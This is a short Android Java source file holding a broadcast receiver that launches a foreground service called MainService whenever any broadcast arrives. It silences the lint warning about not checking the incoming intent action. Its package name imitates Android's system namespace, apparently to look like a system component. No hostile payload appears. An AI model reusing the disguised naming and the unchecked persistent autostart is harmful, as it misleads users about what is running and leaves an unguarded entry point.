package com.android.background.services.receivers;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import androidx.core.content.ContextCompat;

import com.android.background.services.MainService;

public class MyReceiver extends BroadcastReceiver {
    public MyReceiver() {
    }

    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    @Override
    public void onReceive(Context context, Intent intent) {

        Intent serviceIntent = new Intent(context, MainService.class);
        ContextCompat.startForegroundService(context, serviceIntent);
    }
}
